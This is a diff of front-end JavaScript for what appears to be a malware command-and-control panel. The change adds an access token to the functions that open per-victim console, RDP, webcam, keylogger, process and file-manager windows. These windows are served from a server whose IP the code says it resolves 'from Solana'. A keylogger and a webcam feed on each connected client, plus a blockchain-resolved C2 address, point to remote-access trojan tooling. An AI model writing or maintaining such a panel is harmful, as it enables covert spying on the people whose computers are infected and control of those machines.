@@ -263,56 +263,56 @@ async function loadUploads(clientId, container) {
   });
 }
 
-// ---------- REMOTE OPENER (FIXED) ----------
-async function getRemoteIp() {
+// ---------- REMOTE OPENER ----------
+async function getRemoteInfo() {
   try {
     const r = await fetch('/api/remote_ip');
     if (!r.ok) return null;
     const d = await r.json();
-    return d.ip;
+    return d; // { ip, token }
   } catch { return null; }
 }
 
 async function openConsole(c, shell) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
-  window.open(`http://${ip}:3000/cmd.html?` + q.toString(), '_blank', 'width=1000,height=640');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd', token: info.token });
+  window.open(`http://${info.ip}:3000/cmd.html?` + q.toString(), '_blank', 'width=1000,height=640');
 }
 
 async function openRdp(c) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open(`http://${ip}:3000/rdp.html?` + q.toString(), '_blank', 'width=1200,height=760');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
+  window.open(`http://${info.ip}:3000/rdp.html?` + q.toString(), '_blank', 'width=1200,height=760');
 }
 
 async function openWebcam(c) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open(`http://${ip}:3000/webcam.html?` + q.toString(), '_blank', 'width=1000,height=700');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
+  window.open(`http://${info.ip}:3000/webcam.html?` + q.toString(), '_blank', 'width=1000,height=700');
 }
 
 async function openKeylog(c) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open(`http://${ip}:3000/keylog.html?` + q.toString(), '_blank', 'width=1000,height=700');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
+  window.open(`http://${info.ip}:3000/keylog.html?` + q.toString(), '_blank', 'width=1000,height=700');
 }
 
 async function openProcs(c) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open(`http://${ip}:3000/procs.html?` + q.toString(), '_blank', 'width=1100,height=800');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
+  window.open(`http://${info.ip}:3000/procs.html?` + q.toString(), '_blank', 'width=1100,height=800');
 }
 
 async function openFileManager(c) {
-  const ip = await getRemoteIp();
-  if (!ip) return alert('Remote server IP not found from Solana');
-  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
-  window.open(`http://${ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
+  const info = await getRemoteInfo();
+  if (!info || !info.ip) return alert('Remote server IP not found from Solana');
+  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
+  window.open(`http://${info.ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
   closeDrawer();
 }
 
